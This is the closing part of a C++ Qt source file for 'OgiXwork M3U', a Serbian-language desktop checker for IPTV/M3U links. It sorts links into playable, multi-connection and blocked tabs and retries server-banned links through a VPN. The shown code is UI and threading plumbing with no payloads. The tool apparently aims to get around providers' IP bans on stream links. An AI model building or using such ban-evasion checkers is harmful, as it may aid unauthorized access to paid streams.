        connect(workerThread, &QThread::finished, workerThread,  &QObject::deleteLater);
        workerThread->start();
    });
}

void OgiXApp::stopCheck() {
    if (currentWorker && isChecking) {
        m_stopRequested = true; currentWorker->requestStop();
        phaseLabel->setText("Zaustavljeno."); phaseLabel->setStyleSheet("color: #ff8c00;");
        stopButton->setEnabled(false);
        checkButton->setEnabled(true);
        playableButton->setEnabled(true);
        vpnButton->setEnabled(true);
        isChecking = false;
    }
}

    void OgiXApp::runPlayableCheck() {
    qDebug() << "[PLAYABLE_UI] Dugme pritisnuto";
    if (isChecking) { qDebug() << "[PLAYABLE_UI] Vec traje provera, izlaz"; return; }
    qDebug() << "[PLAYABLE_UI] cleanupWorker pocinje...";
    cleanupWorker();
    qDebug() << "[PLAYABLE_UI] cleanupWorker OK, pokrecem timer...";
    QTimer::singleShot(100, this, [this]() {
        qDebug() << "[PLAYABLE_UI] Timer fired";
        QString raw = checkerInput->toPlainText().trimmed();
        if (raw.isEmpty()) { QMessageBox::warning(this, "Prazno", "Ubaci linkove..."); return; }
        QStringList lines = raw.split('\n', Qt::SkipEmptyParts);
        QList<QString> validLinks;
        for (const QString &line : lines) if (line.contains("://")) validLinks.append(line.trimmed());
        if (validLinks.isEmpty()) { QMessageBox::warning(this, "Greška", "Nema validnih linkova."); return; }
        qDebug() << "[PLAYABLE_UI] validLinks=" << validLinks.size();
        clearAllResultTabs(); currentCheckMode = CheckMode::Playable;
        progressBar->setValue(0); progressBar->setMaximum(validLinks.size());
        phaseLabel->setText("Provera Playable...");
        isChecking = true; m_stopRequested = false;
        checkButton->setEnabled(false); stopButton->setEnabled(true);
        qDebug() << "[PLAYABLE_UI] Kreiram Worker i QThread...";
        currentWorker = new Worker(); workerThread = new QThread();
        currentWorker->moveToThread(workerThread);
        connect(workerThread, &QThread::started, [=]() {
            qDebug() << "[PLAYABLE_UI] QThread::started -> runPlayable()";
            currentWorker->runPlayable(validLinks);
        });
        connect(currentWorker, &Worker::progressUpdated, this, &OgiXApp::updateProgress, Qt::QueuedConnection);
        connect(currentWorker, &Worker::resultFound,     this, &OgiXApp::handleResult,   Qt::QueuedConnection);
        connect(currentWorker, &Worker::phaseChanged,    this, &OgiXApp::updatePhase,    Qt::QueuedConnection);
        connect(currentWorker, &Worker::checkFinished,   this, &OgiXApp::finalizeCheck,  Qt::QueuedConnection);
        connect(currentWorker, &Worker::serverBanDetected, this,
            [this](const QString &serverBase, const QString &reportText) {
                Q_UNUSED(serverBase);
                if (reportText.trimmed().isEmpty()) return;

                QDialog *dlg = new QDialog(this);
                dlg->setWindowTitle("🔒 Server IP Ban Detektovan");
                dlg->setAttribute(Qt::WA_DeleteOnClose);
                dlg->setFixedWidth(520);
                dlg->setStyleSheet("QDialog { background-color: #0d0d1a; }"
                                   "QPushButton { background-color: #aa0000; color: white; "
                                   "border-radius: 6px; padding: 6px 24px; font-weight: bold; }"
                                   "QPushButton:hover { background-color: #cc0000; }");

                QVBoxLayout *layout = new QVBoxLayout(dlg);
                layout->setContentsMargins(16, 16, 16, 12);
                layout->setSpacing(10);

                QLabel *txt = new QLabel(reportText);
                txt->setFont(QFont("Consolas", 10));
                txt->setStyleSheet("QLabel { color: #ff4444; padding: 4px; }");
                txt->setWordWrap(true);
                txt->setTextInteractionFlags(Qt::TextSelectableByMouse);
                layout->addWidget(txt);

                QPushButton *okBtn = new QPushButton("OK");
                okBtn->setFixedWidth(100);
                connect(okBtn, &QPushButton::clicked, dlg, &QDialog::accept);
                QHBoxLayout *btnRow = new QHBoxLayout();
                btnRow->addStretch();
                btnRow->addWidget(okBtn);
                btnRow->addStretch();
                layout->addLayout(btnRow);

                dlg->adjustSize();
                if (parentWidget()) {
                    QPoint center = parentWidget()->geometry().center();
                    dlg->move(center.x() - dlg->width() / 2,
                              center.y() - dlg->height() / 2);
                }
                dlg->show();
            }, Qt::QueuedConnection);
        connect(workerThread, &QThread::finished, currentWorker, &QObject::deleteLater);
        connect(workerThread, &QThread::finished, workerThread,  &QObject::deleteLater);
        qDebug() << "[PLAYABLE_UI] workerThread->start()";
        workerThread->start();
    });
}

void OgiXApp::runVpnRetry() {
    if (isChecking) return;
    QString raw = checkerInput->toPlainText().trimmed();
    if (raw.isEmpty()) { QMessageBox::warning(this, "Prazno", "Ubaci linkove."); return; }
    QStringList lines = raw.split('\n', Qt::SkipEmptyParts);
    QList<QString> validLinks;
    for (const QString &line : lines) if (line.contains("://")) validLinks.append(line.trimmed());
    if (validLinks.isEmpty()) { QMessageBox::warning(this, "Greška", "Nema validnih linkova."); return; }
    cleanupWorker(); clearAllResultTabs();
    QTimer::singleShot(100, this, [this, validLinks]() {
        QString vpnCode = "";
        try {
            cpr::Response r = cpr::Get(cpr::Url{"https://ipinfo.io/json"}, cpr::Timeout{5000});
            if (r.status_code == 200) { auto j = json::parse(r.text); if (j.contains("country")) vpnCode = QString::fromStdString(j["country"].get<std::string>()); }
        } catch (...) {}
        if (vpnCode.isEmpty()) vpnCode = "XX";
        QMap<QString, QString> codeToName = {
            {"AT","Austria"},{"BG","Bulgaria"},{"DE","Germany"},{"US","United States"},
            {"FR","France"},{"IT","Italy"},{"ES","Spain"},{"RU","Russia"},
            {"CA","Canada"},{"BR","Brazil"},{"AU","Australia"},{"JP","Japan"},
            {"IN","India"},{"MX","Mexico"},{"GB","United Kingdom"},{"SE","Sweden"},
            {"CH","Switzerland"},{"NL","Netherlands"},{"BE","Belgium"},{"NO","Norway"},
            {"DK","Denmark"},{"RS","Serbia"}
        };
        QString vpnName = codeToName.value(vpnCode, vpnCode);
        currentCheckMode = CheckMode::Vpn;
        progressBar->setValue(0); progressBar->setMaximum(validLinks.size());
        phaseLabel->setText(QString("Provera sa %1 VPN...").arg(vpnName));
        isChecking = true; m_stopRequested = false;
        checkButton->setEnabled(false); stopButton->setEnabled(true); vpnButton->setEnabled(false);
        currentWorker = new Worker(); workerThread = new QThread();
        currentWorker->moveToThread(workerThread);
        currentWorker->setVpnTag(vpnName); updateVpnCountry(vpnCode);
        connect(workerThread, &QThread::started, [=]() { currentWorker->runVpnRetry(validLinks); });
        connect(currentWorker, &Worker::progressUpdated, this, &OgiXApp::updateProgress,   Qt::QueuedConnection);
        connect(currentWorker, &Worker::vpnDetected,     this, &OgiXApp::updateVpnCountry, Qt::QueuedConnection);
        connect(currentWorker, &Worker::resultFound,     this, &OgiXApp::handleResult,     Qt::QueuedConnection);
        connect(currentWorker, &Worker::phaseChanged,    this, &OgiXApp::updatePhase,      Qt::QueuedConnection);
        connect(currentWorker, &Worker::checkFinished,   this, &OgiXApp::finalizeCheck,    Qt::QueuedConnection);
        connect(workerThread, &QThread::finished, currentWorker, &QObject::deleteLater);
        connect(workerThread, &QThread::finished, workerThread,  &QObject::deleteLater);
        workerThread->start();
    });
}

void OgiXApp::saveResults() {
    QStringList tabContents, tabNames;
    auto collectTab = [&](QTextEdit *tab, const QString &name) {
        if (tab && !tab->toPlainText().trimmed().isEmpty()) {
            tabContents << "═══════════════════════════════════════════════════════════\n" + name +
                           "\n═══════════════════════════════════════════════════════════\n" + tab->toPlainText() + "\n";
            tabNames << name;
        }
    };
    collectTab(singleTab,     "Jednokonekcijske");
    collectTab(multiTab,      "Višekonekcijske");
    collectTab(playSingleTab, "Playable Jednokonekcijske");
    collectTab(playMultiTab,  "Playable Višekonekcijske");
    collectTab(vpnSingleTab,  "VPN Jednokonekcijske");
    collectTab(vpnMultiTab,   "VPN Višekonekcijske");
    collectTab(blockedTab,    "Blokirane IP");
    collectTab(macResultTab,  "Playable MAC");
    if (tabContents.isEmpty()) { QMessageBox::information(this, "Sačuvaj", "Nema rezultata za čuvanje."); return; }
    QString defaultName = QString("OgiXwork_rezultati_%1.txt").arg(QDateTime::currentDateTime().toString("yyyy-MM-dd_HH-mm"));
    QString fileName = QFileDialog::getSaveFileName(this, "Sačuvaj rezultate", defaultName, "Text files (*.txt);;All files (*)");
    if (fileName.isEmpty()) return;
    QFile file(fileName);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) { QMessageBox::critical(this, "Greška", "Ne mogu da sačuvam fajl:\n" + fileName); return; }
    QTextStream out(&file); out.setEncoding(QStringConverter::Utf8);
    out << "OgiXwork M3U - Rezultati provere\nDatum: " << QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss") << "\n\n";
    for (const QString &content : tabContents) out << content << "\n";
    file.close();
    QMessageBox::information(this, "Sačuvano", QString("Rezultati sačuvani u:\n%1\n\nTabovi: %2").arg(fileName, tabNames.join(", ")));
}

void OgiXApp::updateVpnCountry(const QString &country) {
    if (country.isEmpty()) return;
    QMap<QString, QString> codeToName = {
        {"AT","Austria"},{"BG","Bulgaria"},{"DE","Germany"},{"US","United States"},
        {"FR","France"},{"IT","Italy"},{"ES","Spain"},{"RU","Russia"},
        {"CA","Canada"},{"BR","Brazil"},{"AU","Australia"},{"JP","Japan"},
        {"IN","India"},{"MX","Mexico"},{"GB","United Kingdom"},{"SE","Sweden"},
        {"CH","Switzerland"},{"NL","Netherlands"},{"BE","Belgium"},{"NO","Norway"},
        {"DK","Denmark"},{"RS","Serbia"}
    };
    currentVpnCountry = codeToName.value(country, country);
    if (vpnCountLabel) vpnCountLabel->setText(QString("🌍 VPN: %1").arg(currentVpnCountry));
}

void OgiXApp::updateProgress(int current, int total, double speed) {
    if (!isChecking) return;
    int pct = (current >= total) ? 100 : (total > 0 ? current * 100 / total : 0);
    progressBar->setValue(pct); progressBar->setMaximum(100);
    progressLabel->setText(QString("%1 / %2").arg(current).arg(total));
    if (speed > 0) speedLabel->setText(QString("%1 l/s").arg(speed, 0, 'f', 1));
}

void OgiXApp::updatePhase(const QString &text) {
    phaseLabel->setText(text); phaseLabel->setStyleSheet("color: #0099ff;");
}

void OgiXApp::applyColorCoding(QTextEdit *edit, const CheckResult &result) {
    edit->moveCursor(QTextCursor::End);
    QColor textColor = QColor("#ffffff");
    if (result.type == "multi" && result.maxConn >= 10) textColor = QColor("#00ff00");
    edit->setTextColor(textColor); edit->setFontWeight(QFont::Bold);
    edit->append(result.content); edit->moveCursor(QTextCursor::End);
}

void OgiXApp::handleResult(const CheckResult &result) {
    if (!isChecking) return;

    if (currentCheckMode == CheckMode::Normal) {
        if (result.type == "single") {
            if (!singleTab) { singleTab = new QTextEdit(); singleTab->setReadOnly(true); resultNotebook->addTab(singleTab, "Jednokonekcijske (0)"); }
            applyColorCoding(singleTab, result);
            int idx = resultNotebook->indexOf(singleTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("Jednokonekcijske (%1)").arg(++singleCount));
            singleTab->verticalScrollBar()->setValue(singleTab->verticalScrollBar()->maximum());
            if (singleCountLabel) singleCountLabel->setText(QString("✓ Single: %1").arg(singleCount));
        } else if (result.type == "multi") {
            if (!multiTab) { multiTab = new QTextEdit(); multiTab->setReadOnly(true); resultNotebook->addTab(multiTab, "Višekonekcijske (0)"); }
            applyColorCoding(multiTab, result);
            int idx = resultNotebook->indexOf(multiTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("Višekonekcijske (%1)").arg(++multiCount));
            multiTab->verticalScrollBar()->setValue(multiTab->verticalScrollBar()->maximum());
            if (multiCountLabel) multiCountLabel->setText(QString("✓ Multi: %1").arg(multiCount));
        } else if (result.type == "blocked") {
            QString url = result.content.split('\n').first();
            if (!blockedLinksList.contains(url)) { blockedLinksList.append(url); vpnButton->setEnabled(true); }
            if (!blockedTab) {
                blockedTab = new QTextEdit(); blockedTab->setReadOnly(true);
                blockedTab->setTextColor(QColor("#ff3333"));
                blockedTab->append("╔══════════════════════════════════════════╗\n");
                blockedTab->append("║  🔒 BLOKIRANE IP / POTREBAN VPN          ║\n");
                blockedTab->append("║  Server: 403 - Blokira IP                ║\n");
                blockedTab->append("║  Rade sa drugim VPN-om!                  ║\n");
                blockedTab->append("╚══════════════════════════════════════════╝\n");
                resultNotebook->addTab(blockedTab, "🔒 Blokirane (0)");
            }
            blockedTab->moveCursor(QTextCursor::End);
            blockedTab->setTextColor(QColor("#ff3333")); blockedTab->append(result.content);
            int idx = resultNotebook->indexOf(blockedTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("🔒 Blokirane (%1)").arg(++blockedCount));
            blockedTab->verticalScrollBar()->setValue(blockedTab->verticalScrollBar()->maximum());
        }
        return;
    }

    if (currentCheckMode == CheckMode::Playable) {
        if (result.type == "single") {
            if (!playSingleTab) { playSingleTab = new QTextEdit(); playSingleTab->setReadOnly(true); resultNotebook->addTab(playSingleTab, "✔ Playable Jednok. (0)"); }
            applyColorCoding(playSingleTab, result);
            int idx = resultNotebook->indexOf(playSingleTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("✔ Playable Jednok. (%1)").arg(++singleCount));
            playSingleTab->verticalScrollBar()->setValue(playSingleTab->verticalScrollBar()->maximum());
            if (singleCountLabel) singleCountLabel->setText(QString("✓ Single: %1").arg(singleCount));
        } else if (result.type == "multi") {
            if (!playMultiTab) { playMultiTab = new QTextEdit(); playMultiTab->setReadOnly(true); resultNotebook->addTab(playMultiTab, "✔ Playable Višek. (0)"); }
            applyColorCoding(playMultiTab, result);
            int idx = resultNotebook->indexOf(playMultiTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("✔ Playable Višek. (%1)").arg(++multiCount));
            playMultiTab->verticalScrollBar()->setValue(playMultiTab->verticalScrollBar()->maximum());
            if (multiCountLabel) multiCountLabel->setText(QString("✓ Multi: %1").arg(multiCount));
        }
        return;
    }

    if (currentCheckMode == CheckMode::Vpn) {
        if (result.type == "single") {
            if (!vpnSingleTab) { vpnSingleTab = new QTextEdit(); vpnSingleTab->setReadOnly(true); resultNotebook->addTab(vpnSingleTab, "🌍 VPN Jednok. (0)"); }
            applyColorCoding(vpnSingleTab, result);
            int idx = resultNotebook->indexOf(vpnSingleTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("🌍 VPN Jednok. (%1)").arg(++vpnSingleCount));
            vpnSingleTab->verticalScrollBar()->setValue(vpnSingleTab->verticalScrollBar()->maximum());
            ++singleCount; if (singleCountLabel) singleCountLabel->setText(QString("✓ Single: %1").arg(singleCount));
        } else if (result.type == "multi") {
            if (!vpnMultiTab) { vpnMultiTab = new QTextEdit(); vpnMultiTab->setReadOnly(true); resultNotebook->addTab(vpnMultiTab, "🌍 VPN Višek. (0)"); }
            applyColorCoding(vpnMultiTab, result);
            int idx = resultNotebook->indexOf(vpnMultiTab);
            if (idx != -1) resultNotebook->setTabText(idx, QString("🌍 VPN Višek. (%1)").arg(++vpnMultiCount));
            vpnMultiTab->verticalScrollBar()->setValue(vpnMultiTab->verticalScrollBar()->maximum());
            ++multiCount; if (multiCountLabel) multiCountLabel->setText(QString("✓ Multi: %1").arg(multiCount));
        }
        if (vpnCountLabel) vpnCountLabel->setText(QString("🌍 VPN: %1").arg(currentVpnCountry.isEmpty() ? "--" : currentVpnCountry));
        return;
    }
}

void OgiXApp::finalizeCheck(bool wasStopped) {
    isChecking = false;
    checkButton->setEnabled(true); stopButton->setEnabled(false);
    playableButton->setEnabled(true); vpnButton->setEnabled(true); checkerInput->setEnabled(true);
    if (wasStopped) {
        phaseLabel->setText("Zaustavljeno."); phaseLabel->setStyleSheet("color: #ff8c00;");
    } else {
        phaseLabel->setText("Provera završena!"); phaseLabel->setStyleSheet("color: #00ff00;");
        QString msg;
        if (currentCheckMode == CheckMode::Playable) {
            int ps = singleCount;
            int pm = multiCount;
            if (ps > 0 || pm > 0)
                msg = QString("🎬 PLAYABLE PROVERA ZAVRŠENA:\nJednokonekcijske: %1\nVišekonekcijske: %2").arg(ps).arg(pm);
            else
                msg = "🎬 PLAYABLE PROVERA ZAVRŠENA:\nNijedan playable rezultat nije pronađen.";
        } else if (currentCheckMode == CheckMode::Vpn) {
            int vs = vpnSingleCount;
            int vm = vpnMultiCount;
            if (vs > 0 || vm > 0)
                msg = QString("🌍 VPN PROVERA ZAVRŠENA:\nJednokonekcijske: %1\nVišekonekcijske: %2").arg(vs).arg(vm);
            else
                msg = "🌍 VPN PROVERA ZAVRŠENA:\nNijedan rezultat nije pronađen.";
        } else {
            int s = singleCount;
            int m = multiCount;
            if (s > 0 || m > 0)
                msg = QString("✅ PROVERA ZAVRŠENA:\nJednokonekcijske: %1\nVišekonekcijske: %2").arg(s).arg(m);
            else
                msg = "✅ PROVERA ZAVRŠENA:\nNijedan rezultat nije pronađen.";
        }
         QTimer::singleShot(500, this, [this, msg]() { QMessageBox::information(this, "✅ Provera završena", msg); });
    }
}

int main(int argc, char *argv[]) {
    // ── DEBUG FILE LOG ──
    static QFile logFile("E:/IPTV/UTTILITIES/NOnAME/OgiXwork/VSS OgiXworkMakeM3u/OgiXworkMakeM3u_CPP/build/mac_debug.txt");
    if (!logFile.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
    qWarning() << "Neuspešno otvaranje log fajla!";
}
    qInstallMessageHandler([](QtMsgType, const QMessageLogContext&, const QString &msg) {
        if (logFile.isOpen()) {
            logFile.write((msg + "\n").toUtf8());
            logFile.flush();
        }
    });

    // ── END DEBUG ──
    qDebug() << "[STARTUP] === PROGRAM START ===";
    qDebug() << "[STARTUP] QApplication kreiranje...";
    QApplication app(argc, argv);
    qDebug() << "[STARTUP] QApplication OK";
    app.setStyle(new ModernStyle());
    qDebug() << "[STARTUP] Style OK";
    qDebug() << "[STARTUP] OgiXApp konstruktor pocinje...";
    OgiXApp window;
    qDebug() << "[STARTUP] OgiXApp konstruktor GOTOV";
    window.show();
    qDebug() << "[STARTUP] window.show() GOTOV — app.exec() sledi";
    return app.exec();
}

#include "main.moc"
